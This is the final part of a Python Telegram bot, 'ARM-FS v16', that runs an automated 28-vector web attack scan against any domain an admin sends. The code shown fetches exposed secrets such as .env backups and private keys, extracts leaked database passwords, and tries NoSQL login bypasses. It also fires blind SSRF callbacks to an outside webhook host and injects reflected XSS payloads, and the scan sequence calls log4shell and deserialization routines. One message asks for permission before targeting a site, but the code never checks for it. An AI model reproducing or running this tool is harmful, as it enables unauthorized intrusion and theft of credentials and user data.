    "/phpmyadmin/": rb"phpMyAdmin", "/solr/admin": rb"solr", "/.env.bak": rb"[A-Z_]{3,}\s*=",
    "/.env.old": rb"[A-Z_]{3,}\s*=", "/id_rsa": rb"BEGIN (RSA )?PRIVATE KEY", "/.git/HEAD": rb"ref: refs/"}
def a_ext_files(base):
    ui_log("VECTOR 23/28 — Ext Files")
    found_any = False
    def sf(f):
        st, h, b = http_get(base + f, 6)
        if not b or st != 200 or not BASE.real_page(st, b): return None
        sig = EXT_SIGS.get(f)
        if sig and not re.search(sig, b[:4000], re.I): return None
        if not sig and re.match(rb"<(?:html|!DOCTYPE)", b[:80]): return None
        return b
    for it, r in pmap(lambda f: sf(f), EXT_RECON_PATHS, workers=8,
                      timeout=min(PHASE_BUDGET["extfiles"], pleft())):
        if confirm(lambda ff=it: sf(ff), None, "STRONG"):
            txt = r[:300].decode("utf-8","ignore")
            register_strict("HIGH", f"Sensitive file — {it}", txt.splitlines()[:8], f"GET {it}",
                "A05", "HIGH", method="signature content ×2", proof_fn=lambda ff=it: sf(ff))
            found_any = True
            m2 = re.search(r"password\s*[=:]\s*['\"]([^'\"\s]{6,})['\"]", txt)
            if m2: register("CRITICAL", f"DB PASSWORD LEAKED ({it})", [m2.group(1)], it,
                            "A07", "HIGH", "config regex ×2")
    done("ExtFiles")

def a_cors_ext(base):
    ui_log("VECTOR 24/28 — CORS Ext")
    host = base.split("//")[1]
    def probe(origin):
        st, h, b = http_get(base + "/", 8, headers={"Origin": origin})
        acao = h.get("access-control-allow-origin","")
        if acao and (acao == origin or acao == "null"): return (origin, acao)
        return None
    for o in ("null", f"evil-{host}", f"sub.{host}", f"{host}.evil-armf.example.com"):
        r = probe(o)
        if r and confirm(lambda oo=o: probe(oo), None, "STRONG"):
            register_strict("MEDIUM", f"CORS — Origin reflection ({o})", [f"ACAO: {r[1]}"],
                "reflected origin ×2", "A05", "HIGH", method="real ACAO ×2",
                proof_fn=lambda oo=o: probe(oo))
            done("CORS"); return
    reject("CORS extremes", "չանցավ")

def a_nosql_strict(base):
    ui_log("VECTOR 25/28 — NoSQL")
    lp = None
    for lp in ("/login", "/api/login", "/signin", "/auth"):
        st0, h0, b0 = http_post(base + lp, {"username": "ARMF_CTRL_USER", "password": "ARMF_CTRL_PASS"}, 8, js=True)
        if st0 in (200, 401, 403, 302): break
    else:
        reject("NoSQL bypass", "login endpoint չի պատասխանում"); done("NoSQL"); return
    for pl in SQLI_NOSQL_PL:
        def probe(pl=pl):
            st, h, b = http_post(base + lp, {"username": pl, "password": pl}, 8, js=True)
            loc = h.get("location","")
            if loc and re.search(r"dash|home|admin|profile", loc, re.I) and st != st0: return (st, loc)
            return None
        r = probe()
        if r and confirm(lambda: probe(), None, "STRONG"):
            register_strict("HIGH", f"NoSQL auth bypass ({pl}) — REAL LOGIN",
                [f"HTTP {r[0]} → Location: {r[1]}", f"Control: HTTP {st0}"], "login ×2 + control",
                "A07", "HIGH", method="baseline vs payload ×2", proof_fn=lambda: probe())
            done("NoSQL"); return
    reject("NoSQL bypass", "control-ի դեմ չանցավ")

def a_oob_ssrf_ext(pts):
    ui_log("VECTOR 26/28 — OOB SSRF")
    if not OOB_HOST: reject("OOB SSRF", "OOB չկա"); done("OOB"); return
    cb = f"http://{OOB_HOST}.webhook.site/ssrf-{MARKER}"
    def probe(pt):
        send(pt, cb); time.sleep(4)
        return "hit" if oob_hits() else None
    for it, r in pmap(lambda p: probe(p), pts[:80], timeout=min(PHASE_BUDGET["oobssrf"], pleft())):
        if confirm(lambda pt=it: probe(pt), None, "STRONG"):
            register_strict("HIGH", f"Blind SSRF (OOB) — {pt_name(it)}",
                [f"Callback: {cb}", "webhook hit ×2"], "OOB ×2", "A10", "HIGH",
                method="OOB interaction ×2", proof_fn=lambda: "hit" if oob_hits() else None)
            done("OOB"); return
    reject("OOB SSRF", "callback չկա")

def a_api_sweep(base):
    ui_log("VECTOR 27/28 — API Sweep")
    ctrl, _, _ = http_get(base + "/api/admin", 6)
    for path in ("/api/admin/users", "/api/v2/users", "/api/users/all", "/api/export",
                 "/api/dump", "/api/backup", "/api/logs", "/api/config", "/api/internal", "/api/debug/users"):
        def grab(p=path):
            st, h, b = http_get(base + p, 6)
            if st == 200 and b and BASE.real_page(st, b) and re.search(rb'"(id|email|user|name)"', b[:500]):
                return (p, st, b[:200].decode("utf-8","ignore"))
            return None
        r = grab()
        if r and confirm(lambda: grab(), None, "STRONG"):
            p, st, body = r
            ctrl2, _, _ = http_get(base + "/api/admin", 6)
            if ctrl2 == ctrl and ctrl == 200: continue
            register_strict("HIGH", f"API over-permission — {p}", [f"HTTP {st}", body],
                f"GET {p} ×2", "A01", "HIGH", method="real data + control ×2", proof_fn=lambda: grab())
            done("API"); return
    reject("API over-permission", "չհայտնաբերվեց")

def a_xss_ext(pts):
    ui_log("VECTOR 28/28 — XSS Universal")
    def probe(pt, pl):
        st, h, b = send(pt, pl)
        if not b or MARKER.encode() not in b: return None
        ctx = b.decode("utf-8","ignore"); i = ctx.find(MARKER)
        around = ctx[max(0,i-80):i+len(MARKER)+30]
        if "&lt;" in around or "%3c" in around.lower(): return None
        return around if re.search(r"onerror|onload|onbegin|onactivate|ontoggle|<script|javascript:", around, re.I) else None
    found = []
    for it, r in pmap(lambda x: probe(*x), [(pt, pl) for pt in pts for pl in gen_xss_universal()],
                      timeout=min(PHASE_BUDGET["xss_ext"], pleft())):
        pt, pl = it
        if confirm(lambda: probe(pt, pl), None, "STRONG"): found.append((pt, pl))
    for pt, pl in found[:5]:
        register_strict("HIGH", f"Reflected XSS (universal) ({pt_name(pt)})", [f"PoC: {pl[:80]}"],
            pt_name(pt), "A03", "HIGH", method="executable reflection ×2",
            proof_fn=lambda pt=pt, pl=pl: probe(pt, pl))
    if not found: reject("XSS universal", "չհայտնաբերվեց")
    done("XSS-Ext")

# ─── ԱՎՏՈ-ՍԵՍԻԱ ───
def try_auth_session(base):
    user = "armf_" + "".join(random.choices(string.ascii_lowercase, k=6))
    for path, js in (("/register", False), ("/api/register", True)):
        st, h, b = http_post(base + path, {"username": user, "email": f"{user}@armf.test",
                                           "password": "Aa12345678!"}, 8, js=js)
        if st in (200, 201, 302): break
    for path in ("/login", "/signin", "/api/login"):
        st, h, b = http_post(base + path, {"username": user, "password": "Aa12345678!"}, 8, js=True)
        if st in (200, 302) and (S.cookies or h.get("set-cookie") or h.get("authorization")): return True
    return False

# ─── REPORT → TELEGRAM ───
SEV_EMOJI = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"⚪"}
def report(dom):
    el = int(time.time() - T0)
    if not FINDINGS:
        return (f"╔═══════════════════════════╗\n"
                f"║ ✅ <b>FINAL REPORT — VERIFIED</b>\n╠═══════════════════════════╣\n"
                f"🎯 <b>{esc(dom)}</b> · ⏱ {el//60}ր{el%60:02d}վ\n\n"
                f"⚠ <b>100% ռեժիմում ոչ մի finding չհաստատվեց ×2 — կեղծ արդյունք չկա</b>\n\n"
                f"<i>Այս նշանակում է՝ ստուգվել են բոլոր 28 վեկտորները, "
                f"բայց ոչ մին չանցավ ×2 դետերմինիստ proof գեյթը։ Դա ԼԱՎ է՝ "
                f"սկաները երբեք չի հորինում։</i>")
    lines = [f"🎯 <b>{esc(dom)}</b> · ⏱ {el//60}ր{el%60:02d}վ · 💥 <b>{len(FINDINGS)}</b> findings\n"]
    for f in FINDINGS:
        lines.append(f"{SEV_EMOJI.get(f['sev'],'·')} <b>[{f['sev']}/{f['confidence']}]</b> "
                     f"{esc(f['title'])} ({f['owasp']})")
    proof_map = {}
    for p in PROOFS: proof_map.setdefault(p["vuln"], p["result"])
    for fd in FINDINGS:
        res = proof_map.get(fd["title"], [])
        res = res if isinstance(res, list) else [res]
        txt = "\n".join(map(str, res))[:900]
        if txt: lines.append(f"\n<b>▸ {esc(fd['title'])}</b>\n<pre>{esc(txt)}</pre>")
    if REJECTED:
        lines.append("\n<i>── Ստուգված, բայց չհաստատված ×2 (թողնված) ──</i>")
        for rj in REJECTED: lines.append(f"✗ {esc(rj['title'])}")
    if NOTES:
        lines.append("\n<i>── Notes ──</i>")
        for nt in NOTES: lines.append(f"· {esc(nt['title'])}: {esc(nt['text'])}")
    lines.append("\n<i>🛡 ARM-FS · բոլոր findings-ը ×2 դետերմինիստ proof-ով</i>")
    return "\n".join(lines)

def send_long(chat_id, text):
    while text:
        tg("sendMessage", chat_id=chat_id, text=text[:4000],
           parse_mode="HTML", disable_web_page_preview=True)
        text = text[4000:]

# ─── MAIN SCAN ───
def run_scan(chat_id, domain):
    global PANEL, T0, DEADLINE, DOMAIN, FINDINGS, PROOFS, REJECTED, NOTES, S, OOB_HOST, LFI_HIT
    T0 = time.time(); DEADLINE = T0 + BUDGET
    FINDINGS, PROOFS, REJECTED, NOTES = [], [], [], []
    OOB_HOST, LFI_HIT = None, None
    S = requests.Session()
    S.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
    S.mount("https://", ad); S.mount("http://", ad)
    PANEL = Panel(chat_id, domain, BUDGET)
    DOMAIN = domain
    base = base_url(domain)
    try:
        waf_fingerprint(base)
        oob_init()
        if OOB_HOST: ui_log(f"OOB ready: {OOB_HOST[:8]}…")
        globals()["BASE"] = Baseline(base)
        forms, params, pages, uploads = recon(base)
        pts = build_points(base, params, forms)
        ui_log(f"Test points: {len(pts)}")
        try_auth_session(base)
        a_sqli(pts, BASE)
        if phase_alive(): a_xss(pts, pages)
        if phase_alive(): a_lfi(pts)
        if phase_alive(): a_cmdi(pts)
        if phase_alive(): a_ssti(pts)
        if phase_alive(): a_ssrf(pts)
        if phase_alive(): a_redir(pts)
        if phase_alive(): a_idor(base)
        if phase_alive(): a_auth(base)
        if phase_alive(): a_xxe_upload(base)
        if phase_alive(): a_headers(base)
        if phase_alive(): a_misc(base)
        if phase_alive(): a_php2shell(base)
        if phase_alive(): a_php2shell_cve(base)
        if phase_alive(): a_log4shell(base)
        if phase_alive(): a_hosthdr(base)
        if phase_alive(): a_ppoll(pts)
        if phase_alive(): a_crlf(pts)
        if phase_alive(): a_401bypass(base)
        if phase_alive(): a_deser(pts)
        if phase_alive(): a_methods(base)
        if phase_alive(): a_massassign(base)
        if phase_alive(): a_ext_files(base)
        if phase_alive(): a_cors_ext(base)
        if phase_alive(): a_nosql_strict(base)
        if phase_alive(): a_oob_ssrf_ext(pts)
        if phase_alive(): a_api_sweep(base)
        if phase_alive(): a_xss_ext(pts)
        PANEL.finish(report(domain))
    except Exception as e:
        try: PANEL.finish(f"💥 <b>Scan error:</b> {esc(type(e).__name__)}: {esc(e)}\n" + report(domain))
        except Exception: pass

# ─── BOT LOOP ───
BUSY = threading.Semaphore(1)
def handle(update):
    msg = update.get("message") or {}
    chat_id = (msg.get("chat") or {}).get("id")
    if not chat_id: return
    text = (msg.get("text") or "").strip()
    if text.startswith("/start"):
        if not ADMINS:
            ADMINS.add(chat_id)
            json.dump(list(ADMINS), open(ADMIN_FILE, "w"))
            tg("sendMessage", chat_id=chat_id, parse_mode="HTML",
               text="╔════════════════════════════╗\n"
                    "║ 🛡 <b>ARM-FS v16 APEX-ULTRA BOT</b>\n"
                    "╠════════════════════════════╣\n"
                    "✅ Դու գրանցվեցիր որպես <b>ADMIN</b> (առաջին օգտատեր)\n\n"
                    "28 վեկտոր · 100% VERIFIED-ONLY\n"
                    "Findings = proof ×2 դետերմինիստ, այլապես REJECTED\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "<b>Usage:</b>\n"
                    "<code>/scan example.com</code>\n"
                    "<code>/scan example.com --fast</code>\n\n"
                    "🛡 Սա անվտանգության մասնագետի գործիք է — օգտագործիր միայն "
                    "թույլտվություն ունեցող թիրախների վրա։")
        else:
            tg("sendMessage", chat_id=chat_id, text="⛔ Այս բոտը մասնավոր է։")
    elif text.startswith("/scan"):
        if chat_id not in ADMINS:
            tg("sendMessage", chat_id=chat_id, text="⛔ Միայն admin-ը կարող է սկանել։"); return
        parts = text.split()[1:]
        if not parts:
            tg("sendMessage", chat_id=chat_id, text="❗ օգտագործում՝ /scan &lt;domain&gt;")
            return
        domain = parts[0]
        global FAST, BUDGET
        FAST = "--fast" in parts
        if "--budget" in parts:
            try: BUDGET = int(parts[parts.index("--budget")+1])
            except Exception: pass
        if not BUSY.acquire(blocking=False):
            tg("sendMessage", chat_id=chat_id, text="⏳ մեկ սկան արդեն ընթացքի մեջ է"); return
        tg("sendMessage", chat_id=chat_id, parse_mode="HTML",
           text=f"🚀 scan launched: <b>{esc(domain)}</b>\n"
                f"⏱ budget: {BUDGET}s · mode: {'FAST' if FAST else 'FULL'}")
        def job():
            try: run_scan(chat_id, domain)
            finally: BUSY.release()
        threading.Thread(target=job, daemon=True).start()

def main():
    if BOT_TOKEN == "PUT_TOKEN_HERE":
        print("❗ Դիր BOT_TOKEN-ը (Railway Variables կամ env)"); sys.exit(1)
    print("✅ ARM-FS v16-TG bot running…")
    off = 0
    while True:
        try:
            r = requests.get(f"{API}/getUpdates", params={"timeout": 30, "offset": off}, timeout=40)
            for u in r.json().get("result", []):
                off = u["update_id"] + 1
                handle(u)
        except Exception:
            time.sleep(3)

if __name__ == "__main__":
    main()
